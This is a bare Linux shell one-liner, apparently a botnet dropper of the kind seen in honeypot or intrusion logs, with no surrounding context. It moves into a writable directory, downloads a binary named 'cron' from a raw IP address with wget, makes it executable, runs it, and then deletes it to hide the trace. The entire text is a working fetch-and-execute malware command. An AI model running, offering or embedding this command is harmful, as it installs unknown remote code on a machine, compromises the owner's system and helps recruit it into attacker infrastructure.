cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.45/cron; chmod +x cron; ./cron; rm -rf cron
